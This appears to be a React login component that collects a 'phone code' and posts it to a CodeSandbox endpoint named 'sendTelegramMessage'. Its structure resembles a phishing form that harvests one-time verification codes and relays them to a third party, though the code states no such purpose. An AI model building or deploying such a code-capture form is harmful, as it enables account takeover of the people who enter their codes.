import { useState } from "react";
import axios from "axios";

const Homelogin = () => {
  const [phoneCode, setPhoneCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [message, setMessage] = useState(null);

  const handlePhoneCodeChange = (e) => {
    setPhoneCode(e.target.value);
  };

  const handleSubmit = async () => {
    if (!phoneCode) {
      setError("Please enter a phone code.");
      return;
    }

    setLoading(true);
    setError(null);

    try {
      // Send the phone code to the backend
      const response = await axios.post("https://ty376c-3710.csb.app/sendTelegramMessage", { phoneCode });
      setMessage(response.data);
    } catch (err) {
      setError("Failed to send message");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <h1>Home Login</h1>
      {loading && <p>Loading...</p>}
      {error && <p style={{ color: "red" }}>{error}</p>}
      {message && <p>{message}</p>}

      <div>
        <input
          type="text"
          placeholder="Enter phone code"
          value={phoneCode}
          onChange={handlePhoneCodeChange}
        />
        <button onClick={handleSubmit}>Submit</button>
      </div>
    </div>
  );
};

export default Homelogin;
